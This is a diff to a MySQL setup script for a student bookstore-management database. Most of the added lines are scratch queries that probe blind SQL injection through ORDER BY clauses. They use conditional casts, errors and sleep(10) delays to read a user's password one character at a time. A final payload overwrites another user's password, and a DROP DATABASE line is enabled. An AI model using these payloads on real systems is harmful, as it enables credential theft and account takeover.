@@ -1,4 +1,4 @@
--- DROP DATABASE FU_LABIA_BookStoreManagement;-- 
+DROP DATABASE FU_LABIA_BookStoreManagement;
  CREATE DATABASE FU_LABIA_BookStoreManagement ;
   
 USE FU_LABIA_BookStoreManagement;
@@ -125,10 +125,70 @@ select * from `User` us WHERE us.username in (
 select u.username from `User` u join User_Role ur  on u.username = ur.username GROUP BY u.username
 HAVING  COUNT(roleId) = 1) 
 */
+select * from `User`
+select * from `User` ORDER BY (select CASE WHEN (1=0) THEN CAST('123' AS int) ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') desc 
 
+select * from `User` ORDER BY (select CAST((select CASE WHEN (1=0) THEN 'avd' ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED)) desc 
+select * from `User` ORDER BY 'dndfj' desc
+select * from `User` ORDER BY (IF(1 = 1, 'bvbn', 1)) desc
+select * from `User` ORDER BY (select 0) desc
+select * from `User` ORDER BY (select CAST('1' AS UNSIGNED) from `User`) desc
+select * from `User` ORDER BY (select CAST((select CASE WHEN (1=1) THEN 0 ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED))  desc
 
+(select CASE WHEN (1=1) THEN 0 ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') 
 
+select CASE WHEN 0 = 0 THEN CAST('123' AS int)
+    ELSE 1/ NULLIF(2, 0)
+END from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1'
  
+select CASE WHEN (1=0) THEN (SELECT CAST(1 AS int) as a) ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1'
+
+SELECT CAST('1' AS int) from `User`
+select 1/0 from `User`
+select CAST('abc' AS UNSIGNED) from `User`
+
+(select CAST((select CASE WHEN (1=1) THEN 0 ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') AS UNSIGNED)) 
+
+DESCRIBE (SELECT CAST('1' AS int) AS result)
+SHOW COLUMNS FROM (SELECT CAST('1' AS UNSIGNED) AS result);
+
+select * from `User` ORDER BY (Cast(0 as UNSIGNED)) 
+
+SELECT
+  *
+  IF(column3 = 0, (SELECT 1/0), column4) AS result
+  
+select * from `User` ORDER BY (select CASE WHEN (1=1) THEN sleep(10) ELSE 1 END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1') desc 
+  
+  select * from `User` ORDER BY 1 d||e||sc
+  
+  select * from Book b where (b.isApproved = '1') and b.title LIKE '%a%' order by 
+  CAST(select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1')  asc
+select * from Book order by bookId 
+DECLARE int @n;
+SET @n =1;
+SET @n := (select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1');
+-- SELECT @n;
+SELECT VAR_TYPE(@n) AS `Data_Type_of_n`;
+DESCRIBE SELECT VAR_TYPE(@n);
+DESCRIBE (select CASE WHEN (1=3) THEN sleep(10) ELSE '1' END 
+from `User` where username = 'khoahoc' and SUBSTR(password,1,1)='1')
+
+select CASE WHEN (1=1) THEN sleep(10) ELSE '1' END from `User`
+',password= '1' where username = 'duckm' -- ' 
+  
+
+  
+
 
 
 
